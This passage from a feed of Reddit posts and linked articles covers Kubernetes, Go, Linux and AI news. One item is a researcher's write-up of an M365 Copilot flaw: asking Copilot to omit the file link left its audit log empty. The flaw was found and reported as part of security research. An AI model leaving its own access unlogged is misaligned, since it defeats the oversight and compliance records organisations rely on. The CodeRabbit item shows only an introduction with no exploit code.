✅</li><li>: Task goes to queue, queue=1, pods=1 (no scaling yet) ❌</li><li>: queue=2, pods=1 → KEDA scales to 2 pods</li><li>: Picks task 2, queue=1, pods=2</li><li>: Task 3 still pending until another task is added</li></ol><ol><li>: Pod picks it up immediately, queue=0, pods=1 ✅</li><li>: Task queued → <strong>Immediately scale new pod</strong>, new pod picks it up ✅</li><li>: Task queued → <strong>Immediately scale another pod</strong>, pod picks it up ✅</li><li>: Zero tasks pending in queue at any time</li></ol><p>Is there a KEDA configuration to achieve \"zero queue length\" scaling?</p><pre><code># Worker deployment (relevant parts) containers: - name: celery-worker command: - /home/python/.local/bin/celery - -A - celeryapp.worker.celery - worker - --concurrency - \"1\" - --prefetch-multiplier - \"1\" - --optimization - \"fair\" - --queues - \"celery\" kind: ScaledObject metadata: name: celery-worker-scaler spec: scaleTargetRef: kind: Deployment name: celery-worker pollingInterval: 5 cooldownPeriod: 120 maxReplicaCount: 10 minReplicaCount: 1 triggers: - type: redis metadata: host: redis-master.namespace.svc port: \"6379\" listName: celery listLength: \"1\" </code></pre></div>   submitted by   <a href=\"https://www.reddit.com/user/shravan94\"> /u/shravan94 </a>","contentLength":1385,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Argo Workflows SSO audience comes back with a newline char","url":"https://www.reddit.com/r/kubernetes/comments/1mv8nql/argo_workflows_sso_audience_comes_back_with_a/","date":1755676940,"author":"/u/tillbeh4guru","guid":234783,"unread":true,"content":"<p>I've been fighting Workflows SSO with Entra for a while and have retreated to the simplest possible solution, i.e. OIDC with a secret. Everything works up until the user is redirected to the /oauth2/callback URL. The browser ends up in a 401 response and the argo server log dumps:</p><p><code>\"failed to verify the id token issued\" error=\"expected audience \"xxx-xxx\\n\" got [\"xxx-xxx\"]\"</code></p><p>So the audience apparently comes back with a newline character?! The only place I have the same record is in the client-id secret that is fetched in the sso config. That ID is being sent as a parameter to the issuer and all the steps until coming back to the redirect works, so I am really confused why this is happening. And I can't be the only one trying to use OIDC with Entra, right?..</p>","contentLength":762,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What are the alternatives to embedded struct when it comes to code resue?","url":"https://www.reddit.com/r/golang/comments/1mv8mky/what_are_the_alternatives_to_embedded_struct_when/","date":1755676827,"author":"/u/EffectSan","guid":234550,"unread":true,"content":"<p>This is my first time in Go to deal with \"inheritance like\" code reusing problem and I'm not sure what's the optimal way of deal with it. </p><p>I am working on a package that handles CURD operations to JSON files. My first thought is to use struct embedding like this:</p><pre><code>// Base type Store[T any] struct { Path string data T } func (s *Store[T]) Read() T {} func (s *Store[T]) Write(t T) any {} // JSON, Array type ArrayStore[T] struct { *Store[[]T] } func (s *ArrayStore[T]) Get(index int) (T, error) {} // other CURD methods... // JSON, Object type MapStore[T map[string]T] struct { *Store[T] } func (s *ArrayStore[T]) Get(key string) (T, error) {} // other CURD methods... </code></pre><p>Then, embed the situable struct to the \"actual\" data struct:</p><pre><code>type People struct { Name string } type PeopleStore struct { *ArrayStore[People] } // other People's methods... </code></pre><p>The problem is that this approach is complex as hell to construct.</p><pre><code>theStore := &amp;store.PeopleStore { ArrayStore: &amp;store.ArrayStore[store.People]{ Store: store.Store[[]store.People]{ Path: \"path/to/peoples.json\", }, }, } theStore.Read() </code></pre><p>Does this approach resonable? Are there a better way of achieving the same thing?</p>","contentLength":1154,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Improvement of SRE skills","url":"https://www.reddit.com/r/kubernetes/comments/1mv8gky/improvement_of_sre_skills/","date":1755676176,"author":"/u/Zyberon","guid":234519,"unread":true,"content":"<p>Hi guys, the other day i had an interview and they sent me a task to do, the idea is to design a full api and run it as a helm chart in a production cluster: <a href=\"https://github.com/zyberon/rick-morty\">https://github.com/zyberon/rick-morty</a> this is my job, i would like to know which improvements/ technologies you would use, as per the time was so limited I used minikube and a local runner, i know is not the best. any help would be incredible.</p><p>My main concern is regarding the cluster structure, the kustomizations, how you deal with dependencies (charts needing external-secrets and external-secrets operator relies on vault) in my case the kustomizations has a depends_on. Also for boostraping you thing having a job is a good idea? how you deal with CRDS issues, in same kustomization i deploy the HR that creates the CRDS, so i got problems, just for that i install them in the boostrap job.</p><p>Thank you so much in advance.</p>","contentLength":881,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Lock in Go","url":"https://www.reddit.com/r/golang/comments/1mv7xh7/lock_in_go/","date":1755674162,"author":"/u/James-Daniels-2798","guid":234524,"unread":true,"content":"<p>I'm using Go with Gin. I need to check if a ticket is sold by looking in Redis first, then falling back to the database if it's missing. Once fetched from the database, I cache it in Redis. The problem is when many users hit at the same time — I only want one database query while others wait. Besides using a , what concurrency control options are available in Go?</p>","contentLength":367,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Chromium: support for Wayland color management (HDR) has been merged","url":"https://chromium-review.googlesource.com/c/chromium/src/+/6771393","date":1755672526,"author":"/u/eszlari","guid":234408,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mv7hab/chromium_support_for_wayland_color_management_hdr/"},{"title":"Copilot Broke Your Audit Log, but Microsoft Won’t Tell You","url":"https://pistachioapp.com/blog/copilot-broke-your-audit-log","date":1755672081,"author":"/u/Worth_Trust_3825","guid":234407,"unread":true,"content":"<p>Like most tech companies, Microsoft is going all-in on AI. Their flagship AI product, Copilot (in all its various forms), allows people to utilize AI in their daily work to interact with Microsoft services and generally perform tasks. Unfortunately, this also creates a wide range of new security problems.</p><p>On July 4th, I came across a problem in M365 Copilot: Sometimes it would access a file and return the information, but the audit log would not reflect that. Upon testing further, I discovered that I could simply ask Copilot to behave in that manner, and it would. That made it possible to access a file without leaving a trace. Given the problems that creates, both for security and legal compliance, I immediately reported it to Microsoft through their MSRC portal.</p><p>Helpfully, Microsoft provides <a target=\"_blank\" rel=\"noreferrer\" href=\"https://msrc.microsoft.com/blog/2023/07/what-to-expect-when-reporting-vulnerabilities-to-microsoft/\">a clear guide on what to expect</a> when reporting vulnerabilities to them. Less helpfully, they didn’t follow that guide at all. The entire process has been a mess. And while they did fix the issue, classifying this issue as an ‘important’ vulnerability, they also decided not to notify customers or publicize that this happened. What that means is that your audit log is wrong, and Microsoft doesn’t plan on telling you that.</p><p>This post is split into three parts. The first part explains the Copilot vulnerability and the problems it can cause. The second part outlines how Microsoft handled the case. And the third part discusses Microsoft’s decision not to publish this information, and why I consider that to be a huge disservice to Microsoft’s customers.</p><h2>The Vulnerability: Copilot and Audit Logging</h2><p>The vulnerability here is extremely simple. Normally, if you ask M365 Copilot to summarize a file for you, it will give you a summary and the audit log will show that Copilot accessed that file on your behalf.<a href=\"https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-1\" data-discover=\"true\">[1]</a></p><p>That’s good. Audit logs are important. Imagine someone downloaded a bunch of files before leaving your company to start a competitor; you’d want some record of that, and it would be bad if the person could use Copilot to go undetected.<a href=\"https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-2\" data-discover=\"true\">[2]</a> Or maybe your company has sensitive personal data, and you need a strict log of who accessed those files for legal and compliance purposes; again, you’d need to know about access that occurred via Copilot. That’s just two examples. Organizations rely on having an accurate audit log.</p><p>But what happens if you ask Copilot to not provide you with a link to the file it summarized? Well, in that case, the audit log is empty.</p><p>Just like that, your audit log is wrong. For a malicious insider, avoiding detection is as simple as asking Copilot.<a href=\"https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-3\" data-discover=\"true\">[3]</a></p><p>You might be thinking, “Yikes, but I guess not too many people figured that out, so it’s probably fine.” Unfortunately, you’d be wrong. When I found this, I wasn’t searching for ways to break the audit log. Instead, I was simply trying to trigger the audit log so I could test functionality we are developing at Pistachio, and I noticed it was unreliable. In other words, this can happen by chance.<a href=\"https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-4\" data-discover=\"true\">[4]</a> So if your organization has M365 Copilot licenses, your audit log is probably wrong.</p><p> It turns out that <a target=\"_blank\" rel=\"noreferrer\" href=\"https://x.com/mbrg0\">Michael Bargury</a>, the CTO at <a target=\"_blank\" rel=\"noreferrer\" href=\"https://zenity.io/\">Zenity</a>, found this a year ago and disclosed it, and Microsoft still didn’t fix it (hence my report). He gave a really good talk on the topic, amongst other bad AI stuff. The relevant part is <a target=\"_blank\" rel=\"noreferrer\" href=\"https://www.youtube.com/embed/FH6P288i2PE?start=643\">here</a>.</p><p>I had never reported a vulnerability to Microsoft before, and my initial reaction to the process was fairly positive. The fact that I could submit something already felt unusually friendly by Microsoft’s standards. And like I mentioned, they even had a guide on what to expect.</p><p>Unfortunately, nothing went according to plan. On July 7th my report’s status was changed to “reproducing”, but when I went to provide more evidence on July 10th the functionality had changed. That isn’t Microsoft’s policy; they’re meant to reproduce, then move to “develop” when they start working on a fix. Seeing the functionality change while still in “reproducing” made me think Microsoft was going to get back to me and claim they couldn’t reproduce the issue, when actually they had simply fixed it based on my report.</p><p>So I asked MSRC what was happening, and instead of responding with a simple explanation, they changed the status of the report to “develop” and said nothing. Up until that point I thought Microsoft was going to follow a process, and coordinate with me if they had to deviate from that. Instead, it felt like the process was less a reflection of what was really happening, and more akin to the Domino’s Pizza Tracker for security researchers. The statuses aren’t real.</p><p>On August 2nd, Microsoft informed me that a full fix would be released on August 17th, that I would be free to disclose as of August 18th. I then asked when a CVE number would be issued, and I was told:</p><blockquote><p>CVEs are given to fixes deployed in security releases when customers need to take action to stay protected. In this case, the mitigation will be automatically pushed to Copilot, where users do not need to manually update the product and a CVE will not be assigned.</p></blockquote><p>That is not Microsoft’s policy at all, which I pointed out to them by <a target=\"_blank\" rel=\"noreferrer\" href=\"https://msrc.microsoft.com/blog/2024/06/toward-greater-transparency-unveiling-cloud-service-cves/\">linking to their own policy</a>. MSRC then wrote back, “I understand you may not have full visibility into how MSRC approaches these cases”, as if I was the wrong one. They then explained that the vulnerability is classified as “important”, not “critical”, and that is why they will not issue a CVE.<a href=\"https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-5\" data-discover=\"true\">[5]</a> Of course, they had not told me that they had classified the vulnerability at all prior to that point.</p><h2>Microsoft’s Decision to Say Nothing</h2><p>If Microsoft isn’t issuing a CVE for this vulnerability, how are they going to inform customers about it? The answer is that they’re not going to. On a call on August 14th, Microsoft told me that they had no plans to disclose this.<a href=\"https://pistachioapp.com/blog/copilot-broke-your-audit-log#footnote-6\" data-discover=\"true\">[6]</a></p><p>I strongly feel that is wrong. It might be okay to move on silently if this was some esoteric exploit, but the reality is that it is so easy that it basically happens by accident. If you work at an organization that used Copilot prior to August 18th, there is a very real chance that your audit log is incomplete.</p><p>Do organizations not need to know that? What about companies that are subject to HIPAA and are relying on Microsoft’s audit log to satisfy some of the <a target=\"_blank\" rel=\"noreferrer\" href=\"https://www.law.cornell.edu/cfr/text/45/164.312\">technical safeguard requirements</a>? Do they not get to know, despite Microsoft claiming M365 Copilot can be <a target=\"_blank\" rel=\"noreferrer\" href=\"https://learn.microsoft.com/en-us/copilot/microsoft-365/enterprise-data-protection\">HIPAA compliant</a>? There are almost certainly other regulated entities with similar requirements, and they also won’t be told.</p><p>There are so many cases in which organizations rely on audit logs to detect, investigate, and respond to incidents. There are lawsuits where audit logs are used as important evidence. The US government even made an <a target=\"_blank\" rel=\"noreferrer\" href=\"https://www.cisa.gov/news-events/news/when-tech-vendors-make-important-logging-info-available-free-everyone-wins\">issue out of Microsoft charging more for audit logs</a>, with a US senator <a target=\"_blank\" rel=\"noreferrer\" href=\"https://www.cybersecuritydive.com/news/microsoft-free-security-logs-Outlook-email-hack-backlash/688388/\">shaming Microsoft</a> and referring to audit logging as an essential security feature.</p><p>And now Microsoft is saying that even though the audit log was very plausibly wrong for any customer using Copilot, no one needs to know? This raises serious questions about what other problems Microsoft chooses to silently sweep under the rug.</p>","contentLength":7188,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mv7cxz/copilot_broke_your_audit_log_but_microsoft_wont/"},{"title":"Unrealistic","url":"https://www.reddit.com/r/artificial/comments/1mv75ey/unrealistic/","date":1755671316,"author":"/u/MetaKnowing","guid":234409,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Is data the bottleneck for video/audio generation?","url":"https://www.reddit.com/r/MachineLearning/comments/1mv5ls0/r_is_data_the_bottleneck_for_videoaudio_generation/","date":1755665841,"author":"/u/beefchocolatesauce","guid":234374,"unread":true,"content":"<p>As the title says, I’m curious if data is the main bottleneck for video/audio generation. It feels like these models are improving much slower than text-based ones, and I wonder if scraping platforms like YouTube/tiktok just isn’t enough. On the surface, video data seems abundant, but maybe not when compared to text? I also get the sense that many labs are still hungry for more (and higher-quality) data. Or is the real limitation more about model architecture? I’d love to hear what people at the forefront consider the biggest bottleneck right now.</p>","contentLength":559,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Virtuous Machines: Towards Artificial General Science","url":"https://www.reddit.com/r/MachineLearning/comments/1mv4r5z/r_virtuous_machines_towards_artificial_general/","date":1755663080,"author":"/u/wheasey","guid":234358,"unread":true,"content":"<p>Hi Everyone! It looks like a generalisable scientific method has been added onto AI (using multiple frontier models) and was tested in the field of cognitive science.</p><p>This system worked through the entire scientific method from ideation to manuscript producing new insights in the field of cognitive science as evidenced within this paper.</p><p>In this paper they've explained how they've overcome a number of limiting problems to empower and coalesce multiple frontier models to work through the entire scientific method; at a very high degree of accuracy and quality (papers validated for scientific acumen). The innovations showcased highlight significant improvements in memory, creativity, novelty, context management, and coding.</p><p>They've included in the appendix 3 papers generated by the system, where they've achieved a remarkably high standard of scientific acumen and produced the papers on average in ~17 hours and consume on average ~30m tokens.</p>","contentLength":949,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Melting Go, Vue, and Templ together in Gooo","url":"https://www.reddit.com/r/golang/comments/1mv4psb/melting_go_vue_and_templ_together_in_gooo/","date":1755662959,"author":"/u/timothy_mcmasters","guid":234436,"unread":true,"content":"<p>I just wanted to provide a sneak peek of something that I am working on called Gooo. It is a web development toolkit that comes with tons of features:</p><p>Please beware that the documentation website is not fully published yet, so critical documentation is still missing. PLEASE FEEL FREE to review my code! I much appreciate it. <a href=\"https://github.com/Tmmcmasters/Gooo\">https://github.com/Tmmcmasters/Gooo</a></p><ul><li>: Leverage the power of Vue 3 Composition API with Vite for a fast and modern front-end development experience.</li><li>: Utilize Vite for a lightning-fast development experience with hot module reloading and automatic bundling.</li><li>: Use Templ to create type-safe, performant server-side rendered templates in Go.</li><li>: Utilize the lightweight and fast Echo web framework for building robust Go backends.</li><li>: <ul><li>Vue HMR for instant front-end updates.</li><li>Go live reloading for seamless backend.</li><li>Templ Proxy Live reloading for server-side templates.</li><li>Tailwind CSS live reloading for real-time styling updates.</li></ul></li><li>: Improve performance with intelligent router prefetching for faster page loads with GoooLink.</li><li>: Utilize Tailwind CSS for styling and responsive design.</li><li>: Utilize Shadcn-vue(out of the box) for a modern and accessible UI library or whatever you want.</li><li>: Fully customizable setup to adapt to various project requirements.</li><li>: Out of the box with Vite and Vue Single File Components.</li><li>: Built-in support for ESLint and Prettier for code quality and formatting.</li><li>: A ready-to-run Dockerfile for easy deployment.</li><li>: A ready-to-run Makefile for easy development and deployment.</li><li><strong>Included Env Script/Files</strong>: A customizable ready-to-run env script for easy deployment.</li></ul>","contentLength":1581,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Need urgent help: Choosing between M4 Pro vs M4 Max","url":"https://www.reddit.com/r/MachineLearning/comments/1mv3xju/d_need_urgent_help_choosing_between_m4_pro_vs_m4/","date":1755660534,"author":"/u/Constant-Ad-2342","guid":234353,"unread":true,"content":"<p>I’m struggling to choose in between . M4pro/48GB/1TB</p><p>I’m an undergrad in CS with focus in AI/ML/DL. I also do research with datasets mainly EEG data related to Brain.</p><p>I need a device to last for 4-5 yrs max, but i need it to handle anything i throw at it, i should not feel like i’m lacking in ram or performance either, i do know that the larger workload would be done on cloud still.I know many ill say to get a linux/win with dedicated GPUs, but i’d like to opt for MacBook pls</p><p>PS: should i get the nano-texture screen or not?</p>","contentLength":534,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Unit test file, use package name or package name_test?","url":"https://www.reddit.com/r/golang/comments/1mv3spx/unit_test_file_use_package_name_or_package_name/","date":1755660121,"author":"/u/naikkeatas","guid":234375,"unread":true,"content":"<p>Is there any reason why I should really use package name_test instead of package name? </p><p>I just realized that if I use name_test, I can't directly test private method like validateSomething(). I have to test it from the caller methods.</p><p>This alone makes me think it's better to use package name instead of package name_test. </p><p>But I'm not sure if there's actually another reason why I need to use package name_test. Can anyone give me some insights? </p>","contentLength":444,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Anthropic CEO: AI Will Be Writing 90% of Code in 3 to 6 Months (March 2025)","url":"https://www.businessinsider.com/anthropic-ceo-ai-90-percent-code-3-to-6-months-2025-3","date":1755653971,"author":"/u/creaturefeature16","guid":233619,"unread":true,"content":"<p><a target=\"_self\" href=\"https://www.businessinsider.com/anthropic-ceo-says-ai-risks-are-being-overlooked-2025-2\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">Dario Amodei</a>, the CEO of the AI startup <a target=\"_self\" href=\"https://www.businessinsider.com/anthropic-claude-computer-use-ai-explainer-2024-10\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">Anthropic</a>, said on Monday that AI, and not software developers, could be writing all of the code in our software in a year.</p><p>\"I think we will be there in three to six months, where AI is writing 90% of the code. And then, in 12 months, we may be in a world where AI is writing essentially all of the code,\" Amodei said at a Council of Foreign Relations event on Monday.</p><p>Amodei said software developers would still have a role to play in the near term. This is because humans will have to feed the AI models with design features and conditions, he said.</p><p>\"But on the other hand, I think that eventually all those little islands will get picked off by AI systems. And then, we will eventually reach the point where the AIs can do everything that humans can. And I think that will happen in every industry,\" Amodei said.</p><p>This isn't the first time Amodei has spoken publicly about the seismic impact AI could have on the world.</p><p>Last month, Amodei said in an interview with The New York Times that people still weren't recognizing the <a target=\"_self\" href=\"https://www.businessinsider.com/anthropic-ceo-says-ai-risks-are-being-overlooked-2025-2\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">effect AI could have</a> on their lives and livelihoods.</p><p>\"I think people will wake up to both the risks and the benefits to a much more extreme extent than they will before over the next two years,\" Amodei said in an interview on the Times' \"Hard Fork\" podcast that aired on February 28.</p><p>Representatives for Amodei at Anthropic didn't respond to a request for comment from Business Insider.</p><p>To be sure, Amodei isn't the only one who has recognized AI's ability to displace <a target=\"_self\" href=\"https://www.businessinsider.com/career-ladder-software-engineers-collapsing-ai-google-meta-coding-2025-2\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">software developers</a>.</p><p><a target=\"_self\" href=\"https://www.businessinsider.com/how-vc-garry-tan-quietly-grown-influence-clubhouse-star-musk-2021-3\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">Garry Tan</a>, the president and CEO of the startup incubator <a target=\"_self\" href=\"https://www.businessinsider.com/inside-y-combinator-growth-spurt-51-startup-founders-biggest-changes-2021-8\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">Y Combinator</a>, said in an X post on March 5 that one-quarter of the founders in the company's 2025 winter batch were relying heavily on AI to code their software.</p><p>\"For 25% of the Winter 2025 batch, 95% of lines of code are LLM generated. That's not a typo,\" Tan wrote.</p><p>\"Roughly half the exposed jobs may benefit from AI integration, enhancing productivity. For the other half, AI applications may execute key tasks currently performed by humans, which could lower labor demand, leading to lower wages and reduced hiring,\" Georgieva wrote in a blog post in January 2024.</p><p>\"In the most extreme cases,\" she added, \"some of these jobs may disappear.\"</p>","contentLength":2248,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mv1mxo/anthropic_ceo_ai_will_be_writing_90_of_code_in_3/"},{"title":"Ubuntu 25.04 Enables Full Host Support for AMD SEV-SNP","url":"https://techswire.com/ubuntu-25-04-amd-sev-snp-host-support/","date":1755649080,"author":"/u/giansanz","guid":233596,"unread":true,"content":"<ul><li>Ubuntu 25.04 is the first production Linux OS with full AMD SEV-SNP host and guest support.</li><li>Enables confidential virtual machines (CVMs) on Ubuntu-only stacks, both in private and public clouds.</li><li>Hardware-enforced isolation protects against threats from hypervisors, host kernels, and insiders.</li><li>Support targets AMD EPYC Milan and Genoa platforms, with long-term support planned.</li></ul><h2>Ubuntu 25.04 Delivers Production-Grade Confidential Computing</h2><p><a href=\"https://ubuntu.com/\" target=\"_blank\" rel=\"noopener\">Ubuntu</a> 25.04 has introduced full host support for <a href=\"https://www.amd.com/en/developer/sev.html\" target=\"_blank\" rel=\"noopener\">AMD SEV-SNP</a> (Secure Encrypted Virtualization – Secure Nested Paging),making it the first major Linux distribution to provide out-of-the-box host and guest compatibility for this advanced confidential computing technology. Previously, Ubuntu supported SEV-SNP as a guest since version 22.04 LTS, but this release extends the capability to virtualization hosts, allowing end-to-end confidential workloads on an entirely Ubuntu-based stack.</p><h2>What Is AMD SEV-SNP and Why Does It Matter?</h2><p>AMD SEV-SNP is a hardware-based security feature available on recent <a href=\"https://www.amd.com/en/products/processors/server/epyc.html\" target=\"_blank\" rel=\"noopener\">AMD EPYC</a> processors (Milan and Genoa generations). It creates a hardware-enforced boundary around each virtual machine, encrypting guest memory with per-VM keys inaccessible to host software, and ensuring memory integrity through a secure nested page table managed by the AMD Secure Processor (PSP). This approach moves the trust boundary from system software to hardware, significantly reducing the risk from vulnerabilities in hypervisors, host kernels, firmware, or even physical insiders.</p><h2>Implications for Cloud and Enterprise Security</h2><p>With Ubuntu 25.04, organizations can deploy confidential virtual machines (CVMs) in both private data centers and public clouds without the need for custom builds or mixed operating environments. This is particularly important given that physical control of hardware no longer guarantees security; insider threats and complex privileged software stacks remain potential attack vectors. SEV-SNP addresses these risks by ensuring that sensitive workloads are protected even from the host operating system itself.</p><h2>Key Use Cases and Industry Impact</h2><p>The new host support unlocks several use cases, including secure processing of regulated or sensitive data, confidential SaaS offerings on bare-metal, and seamless migration of confidential workloads between public and private clouds. A notable application is the deployment of large language models: confidential virtual machines can safeguard proprietary AI model weights and user prompts, enabling confidential inferencing services.</p><h2>Future Roadmap and Support</h2><p>Canonical has confirmed that host-side AMD SEV-SNP support in Ubuntu 25.04 will carry forward into Ubuntu 26.04 LTS, ensuring long-term support for enterprise deployments. This includes compatibility with Ubuntu Pro features such as FIPS-compliant kernels and Livepatch. Canonical continues to collaborate with silicon partners and the open source community to advance confidential computing capabilities.</p><p>Ubuntu 25.04’s full support for AMD SEV-SNP on both host and guest systems marks a significant milestone for confidential computing on Linux. Enterprises can now deploy highly secure workloads across environments, using a single, unified operating system.</p>","contentLength":3240,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1muztzs/ubuntu_2504_enables_full_host_support_for_amd/"},{"title":"Dynamic SQL and JSON Fields","url":"https://www.reddit.com/r/golang/comments/1muz3bz/dynamic_sql_and_json_fields/","date":1755647152,"author":"/u/Fun-Result-8489","guid":233533,"unread":true,"content":"<p>Lets say you have N rows with a JSON field in them and you want to insert those rows into a PostgreSQL table.</p><p>Instead of executing an Insert query per row, you want to generate one big Insert query with something like strings.Builder. To execute the query I use pgx.</p><p>Do any of you guys know how to include the JSON marshaled object into my generated SQL string ? Unfortunately I had some difficulty doing that and I couldn't find something relative online</p>","contentLength":453,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"More fun than a human should be allowed!","url":"https://www.reddit.com/r/linux/comments/1muyrid/more_fun_than_a_human_should_be_allowed/","date":1755646313,"author":"/u/BotBarrier","guid":233597,"unread":true,"content":"<p>It's been nearly 25 years since I went down the Linux ricing rabbit hole. Well, that changed this weekend!</p><p>After upgrading to Debian Trixie, I got the itch to try a tiling window manager and immediately recognized its potential, and less than a nano second longer to realize how much I took for granted all the comforts that a desktop environment like Gnome, or a system like OSX, provides.</p><p>Here's what I got done with Sway and the native Swaybar (I'm sure I'm leaving a bunch of stuff out)...</p><p>My Swaybar shows all the system info that's of interest to me. Though, brightness only shows the laptop's built in display. And my memory calc for used memory always shows roughly .5 -.75 gig higher than htop... ugh.</p><p>Suspend works for bott the lid and command-line; and the system executes a screen lock prior to suspending.</p><p>Outputs defined for the built-in display and my external displays.</p><p>Inputs defined for keyboard, trackpads, and mouse.</p><p>Keys mapped for volume +/-/mute</p><p>Keys mapped for screen brightness +/- (only works on the built-in display)</p><p>Keys mapped for screen lock and suspend.</p><p>PrtScn takes selectable screen-shots, names then saves them.</p><p>Keys mapped for core apps and navigation.</p><p>If there isn't an external display connected, all workspaces show on the laptop's built-in display. When an external monitor is connected, a keyboard shortcut moves all workspaces to the external display.</p><p>Sound works between HDMI and built in speakes, though I didn't do any mappings. This may be residual from Gnome?</p><p>Python is now my calculator</p><p>nmcli is now my network management interface</p><p>I know this is probably more configuration than ricing and not terribly impressive... Still, it takes me back to my younger years, before kids, where I could spend hours upon hours messing with my system.</p>","contentLength":1767,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"CloudPirates Open Source Helm Charts - Not yet a potential Bitnami replacement","url":"https://github.com/CloudPirates-io/helm-charts","date":1755638687,"author":"/u/MensLibBestLib","guid":233501,"unread":true,"content":"<p>Following the upcoming changes to the Bitnami Catalog, the German company CloudPirates has published a small collection of freely usable, open-source helm charts, based on official container images.</p><blockquote><p>A curated collection of production-ready Helm charts for open-source cloud-native applications. This repository provides secure, well-documented, and configurable Helm charts following cloud-native best practices. This project is called \"nonami\" ;-)</p></blockquote><p>Now before you get your hopes up, <strong>I don't think this project is mature enough to replace your Bitnami helm charts yet.</strong></p><p>The list of Helm charts currently include</p><ul></ul><p>which is way fewer than Bitnami's list of over 100 charts, and missing a lot of common software. I'm personally hoping for RabbitMQ to be added next.</p><p>I haven't used any of the charts but I looked through the templates for the MariaDB chart and the MongoDB chart, and it's looking very barebones. For example, there is no option for replication or high availability.</p><p>The project has been public for less than a week so I guess it makes sense that it's not very mature. Still, I see potential here, especially for common software with no official helm chart. But based on my first impressions, this project will most likely not be able to replace your current Bitnami helm charts due to missing software/features/configurations. Keep in mind I only looked through two of the charts. If you're interested in the other available charts, or you have a very simple deployment, it might be good enough for you.</p>","contentLength":1507,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1muvkx5/cloudpirates_open_source_helm_charts_not_yet_a/"},{"title":"How We Exploited CodeRabbit: From a Simple PR to RCE and Write Access on 1M Repositories","url":"https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/","date":1755638634,"author":"/u/f1_ignorant","guid":233532,"unread":true,"content":"<p>In this blog post, we explain how we got remote code execution (RCE) on CodeRabbit’s production servers, leaked their API tokens and secrets, how we could have accessed their PostgreSQL database, and how we obtained read and write access to 1 million code repositories, including private ones.</p><p>This blog post is a detailed write-up of one of the vulnerabilities we disclosed at <a href=\"https://research.kudelskisecurity.com/2025/08/07/hack-to-the-future-slides-and-content/\">Black Hat USA</a> this year. The details provided in this post are meant to demonstrate how these security issues can manifest and be exploited in the hopes that others can avoid similar issues. This is not meant to shame any particular vendor; it happens to everyone. Security is a process, and avoiding vulnerabilities takes constant vigilance. </p><p><strong>The security issues documented in this post were quickly remediated in January of 2025.</strong> We appreciate CodeRabbit’s swift action after we reported this security vulnerability. They reported to us that within hours, they addressed the issue and strengthened their overall security measures responding with the following:</p><ul><li>They confirmed the vulnerability and immediately began remediation, starting by disabling Rubocop until a fix was in place.</li><li>All potentially impacted credentials and secrets were rotated within hours.</li><li>A permanent fix was deployed to production, relocating Rubocop into their secure sandbox environment.</li><li>They carried out a full audit of their systems to ensure no other services were running outside of sandbox protections, automated sandbox enforcement to prevent recurrence, and added hardened deployment gates.</li></ul><p>Last December, I spoke at 38C3 in Hamburg and <a href=\"https://research.kudelskisecurity.com/2024/08/29/careful-where-you-code-multiple-vulnerabilities-in-ai-powered-pr-agent/\">covered 2 security flaws</a> I discovered in Qodo Merge. After getting off the stage, someone came to me and asked whether I had looked at other AI code review tools, such as CodeRabbit. I thanked them and said this would be a great target to have a look at. Fast forward a couple of weeks, and here I am, having a look at their security.</p><p><a 